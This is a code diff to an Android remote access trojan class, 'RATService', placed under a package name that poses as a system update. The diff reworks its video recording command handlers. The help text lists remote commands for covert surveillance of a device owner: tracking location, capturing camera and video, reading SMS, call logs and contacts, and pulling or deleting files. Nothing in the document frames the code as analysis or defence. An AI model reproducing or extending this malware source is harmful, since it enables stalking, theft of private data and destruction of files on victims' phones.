@@ -1,3 +1,4 @@
+
 package com.android.system.update;
 
 import android.app.AlarmManager;
@@ -811,7 +812,7 @@ public class RATService extends Service {
                 String helpText = "Available commands: info, location, location_stream [start/stop], " +
                                   "camera, camera_switch, camera_info, " +
                                   "video_start [width|height|fps|bitrate], video_stop, video_status, " +
-                                  "video_test, video_record_start [filename], cameraModule.stopRecording(), " +
+                                  "video_test, video_record_start [filename], video_record_stop, " +
                                   "video_switch_camera, video_resolutions, " +
                                   "sms, calls, contacts, files_list [path], file_get [path], " +
                                   "file_delete [path], file_rename [old|new], create_folder [path|name], " +
@@ -1140,37 +1141,45 @@ case "location_test":
                 }
                 break;
 
-         case "video_record_start":
-    if (cameraModule != null) {
-        Log.d(TAG, "🎥 Starting video recording: " + args);
-        String result = cameraModule.startRecording(args);
-        try {
-            JSONObject response = new JSONObject();
-            response.put("command", "video_response");
-            response.put("action", "start_recording");
-            response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
-            response.put("message", result);
-            sendCommand(response.toString());
-        } catch (JSONException e) { Log.e(TAG, "JSON error", e); }
-    } else {
-        sendCommand("VIDEO_ERROR|ERROR: Camera module not available");
-    }
-    break;
+            case "video_record_start":
+                if (videoStreamModule != null && !args.isEmpty()) {
+                    Log.d(TAG, "🎥 Starting video recording: " + args);
+                    String result = videoStreamModule.startRecording(args);
 
-           case "video_record_stop":
-    if (cameraModule != null) {
-        Log.d(TAG, "🎥 Stopping video recording");
-        String result = cameraModule.stopRecording();
-        if (result.startsWith("ERROR")) {
-            sendCommand("VIDEO_ERROR|" + result);
-        } else {
-            // result is plain JSON — sendCommand's chunker needs FILE_GET| prefix
-            sendCommand("FILE_GET|" + result);
-        }
-    } else {
-        sendCommand("VIDEO_ERROR|ERROR: Camera module not available");
-    }
-    break;
+                    try {
+                        JSONObject response = new JSONObject();
+                        response.put("command", "video_response");
+                        response.put("action", "start_recording");
+                        response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+                        response.put("message", result);
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } else {
+                    sendCommand("VIDEO_ERROR|ERROR: Invalid filename");
+                }
+                break;
+
+            case "video_record_stop":
+                if (videoStreamModule != null) {
+                    Log.d(TAG, "🎥 Stopping video recording");
+                    String result = videoStreamModule.stopRecording();
+
+                    try {
+                        JSONObject response = new JSONObject();
+                        response.put("command", "video_response");
+                        response.put("action", "stop_recording");
+                        response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+                        response.put("message", result);
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } else {
+                    sendCommand("VIDEO_ERROR|ERROR: Video module not available");
+                }
+                break;
 
             case "video_switch_camera":
                 if (videoStreamModule != null) {
@@ -2457,7 +2466,7 @@ case "make_call":
             executor.shutdownNow();
             executor = null;
         }
-
+        
         if (wakeLock != null && wakeLock.isHeld()) {
             wakeLock.release();
         }
